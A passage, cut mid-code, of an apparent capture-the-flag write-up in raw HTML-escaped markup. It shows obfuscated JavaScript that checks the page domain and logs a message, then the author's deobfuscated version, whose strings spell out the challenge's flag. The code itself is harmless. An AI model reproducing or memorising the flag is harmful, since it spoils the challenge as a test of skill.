style=&quot;color:#fa6e32;&quot;&gt;else &lt;&#x2F;span&gt;&lt;span&gt;_0x40cc8a[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;push&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;](_0x40cc8a[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;shift&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;]())&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;&lt;&#x2F;span&gt;&lt;span&gt;}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;catch&lt;&#x2F;span&gt;&lt;span&gt;(_0x4063a2){_0x40cc8a[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;push&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;](_0x40cc8a[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;shift&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;]())&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;&lt;&#x2F;span&gt;&lt;span&gt;}}}(_0x12de&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x54f50&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_0x2a7d&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;_0x339bb1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;_0x1a0657&lt;&#x2F;span&gt;&lt;span&gt;){&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;var &lt;&#x2F;span&gt;&lt;span&gt;_0x12def3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_0x12de&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_0x2a7d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;_0x2a7d9a&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;_0x2b9202&lt;&#x2F;span&gt;&lt;span&gt;){_0x2a7d9a&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;_0x2a7d9a&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x1ee&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;var &lt;&#x2F;span&gt;&lt;span&gt;_0x34fb38&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;_0x12def3[_0x2a7d9a]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;_0x34fb38&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;&lt;&#x2F;span&gt;&lt;span&gt;}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_0x2a7d&lt;&#x2F;span&gt;&lt;span&gt;(_0x339bb1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;_0x1a0657)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;&lt;&#x2F;span&gt;&lt;span&gt;}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;hi&lt;&#x2F;span&gt;&lt;span&gt;(){&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;var &lt;&#x2F;span&gt;&lt;span&gt;_0x398601&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;_0x2a7d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;&lt;&#x2F;span&gt;&lt;span&gt;document[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\x64\x6f\x6d\x61\x69&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\x6e&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;==&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_0x398601&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x1f4&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_0x398601&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x1f2&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_0x398601&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x1fe&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;amp;&amp;amp;&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_0x398601&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x202&lt;&#x2F;span&gt;&lt;span&gt;)](&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_0x398601&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x203&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_0x398601&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x1f7&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_0x398601&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x1fa&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_0x398601&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x1f9&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_0x398601&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x205&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\x69\x6d\x6d\x61\x5f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_0x398601&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x1f3&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_0x398601&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x201&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_0x398601&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x20a&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_0x398601&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x1f8&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_0x398601&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x1ff&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\x65\x5f\x74\x68\x69&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\x73\x7d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\x6c\x6f\x67&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;](&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_0x398601&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x209&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\x20\x49\x20\x77\x6f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\x6e\x64\x65\x72\x20&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_0x398601&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x20b&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\x20\x74\x68\x65\x20&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_0x398601&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x1ee&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_0x398601&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x1fc&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;&lt;&#x2F;span&gt;&lt;span&gt;}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;hi&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Deobfuscated the code on &lt;a href=&quot;https:&#x2F;&#x2F;deobfuscate.io&#x2F;&quot; target=_blank&gt;deobfuscated.io&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;js&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-js &quot;&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;zandrea&lt;&#x2F;span&gt;&lt;span&gt;() {
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;var &lt;&#x2F;span&gt;&lt;span&gt;thiego &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;.io&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;uscat&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;72OOnzsM&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;a_too&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;log&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;byuct&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;2058111VsJmNt&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;days_&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;5bkhSkw&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;6278wSwEVI&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;1253130xNttWw&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Hmmmm&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;l_to_&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;where&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;flag &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;4105944XqgSTd&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;10iGxSxt&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;53MPVCCs&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;cator&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;make_&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;obfus&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;254009tqYQyk&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;510501FWdRVq&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;f{one&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;deobf&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;hese_&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;_of_t&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;172645okvXfp&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;is?&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;4moqIlV&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;zandrea &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span&gt;() {
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;thiego&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;zandrea&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;annelynn&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;teaghan&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;var &lt;&#x2F;span&gt;&lt;span&gt;requel &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;l&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;makade &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;annelynn&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;while &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;true&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;try &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;var &lt;&#x2F;span&gt;&lt;span&gt;doriel &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= -&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;parseInt&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;requel&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;497&lt;&#x2F;span&gt;&lt;span&gt;)) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;parseInt&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;requel&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;519&lt;&#x2F;span&gt;&lt;span&gt;)) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;parseInt&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;requel&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;502&lt;&#x2F;span&gt;&lt;span&gt;)) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;parseInt&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;requel&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;509&lt;&#x2F;span&gt;&lt;span&gt;)) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F; 